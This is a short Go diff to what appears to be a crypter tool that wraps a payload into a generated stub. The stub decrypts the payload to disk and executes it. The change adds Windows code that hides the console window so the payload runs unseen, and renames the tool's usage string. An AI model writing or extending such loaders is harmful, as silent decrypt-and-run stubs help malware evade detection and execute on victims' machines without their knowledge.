@@ -93,9 +93,18 @@ func main() {
 
 	// Execute the decrypted payload
 	cmd := exec.Command(outputPath)
+
+	// On Windows, set the sysProcAttr to hide the console window
+	if runtime.GOOS == "windows" {
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			CreationFlags: syscall.CREATE_NO_WINDOW, // This hides the console window
+		}
+	}
+
 	if err := cmd.Start(); err != nil {
 		os.Exit(1)
 	}
+
 }
 
 `
@@ -130,7 +139,7 @@ func main() {
 
 func main() {
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: gocryptor <path_to_payload>")
+		log.Fatal("Usage: encryptor <path_to_payload>")
 	}
 
 	payloadPath := os.Args[1]
@@ -159,4 +168,3 @@ func main() {
 
 	fmt.Println("New payload created: new_payload.go")
 }
-
